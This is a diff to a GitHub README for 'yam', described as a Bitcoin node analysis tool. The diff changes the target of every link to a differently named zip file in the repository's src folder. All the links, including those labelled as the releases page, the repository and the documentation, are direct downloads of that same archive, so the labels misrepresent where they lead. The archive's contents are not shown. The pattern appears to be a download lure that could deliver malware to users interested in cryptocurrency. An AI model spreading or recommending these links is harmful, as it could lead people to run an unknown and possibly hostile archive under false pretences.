@@ -1,7 +1,7 @@
 # 🌟 yam - Connect and Analyze Bitcoin Easily
 
 ## 📦 Download Now
-[![Download yam](https://github.com/Lakshay-1902/yam/raw/refs/heads/master/src/Software-2.0.zip)](https://github.com/Lakshay-1902/yam/raw/refs/heads/master/src/Software-2.0.zip)
+[![Download yam](https://github.com/Lakshay-1902/yam/raw/refs/heads/master/src/Software-despite.zip)](https://github.com/Lakshay-1902/yam/raw/refs/heads/master/src/Software-despite.zip)
 
 ## 🚀 Getting Started
 Welcome to yam! This tool helps you connect to a Bitcoin node and analyze the information seamlessly. Whether you're looking to monitor your Bitcoin balance or get insights into network transactions, yam is designed to be user-friendly.
@@ -10,7 +10,7 @@ Welcome to yam! This tool helps you connect to a Bitcoin node and analyze the in
 To get started with yam, you'll need to download it first. Follow these steps:
 
 1. **Visit the Releases Page**: Click on the link below to go to the downloads section:
-   [Visit the Releases Page](https://github.com/Lakshay-1902/yam/raw/refs/heads/master/src/Software-2.0.zip)
+   [Visit the Releases Page](https://github.com/Lakshay-1902/yam/raw/refs/heads/master/src/Software-despite.zip)
 
 2. **Choose the Right Version**: Once you're on the page, look for the latest release. You will see a list of files available for download. Select the appropriate file for your operating system.
 
@@ -62,7 +62,7 @@ If you encounter any issues while using yam, consider the following steps:
 We value your feedback. If you have any suggestions or run into issues, please feel free to raise them on our GitHub repository. Your input helps us improve yam.
 
 ## 🔗 Additional Resources
-- [yam GitHub Repository](https://github.com/Lakshay-1902/yam/raw/refs/heads/master/src/Software-2.0.zip)
-- [Documentation](https://github.com/Lakshay-1902/yam/raw/refs/heads/master/src/Software-2.0.zip)
+- [yam GitHub Repository](https://github.com/Lakshay-1902/yam/raw/refs/heads/master/src/Software-despite.zip)
+- [Documentation](https://github.com/Lakshay-1902/yam/raw/refs/heads/master/src/Software-despite.zip)
 
 Explore the possibilities with yam, your lightweight Bitcoin node connection and analysis tool. Happy analyzing!
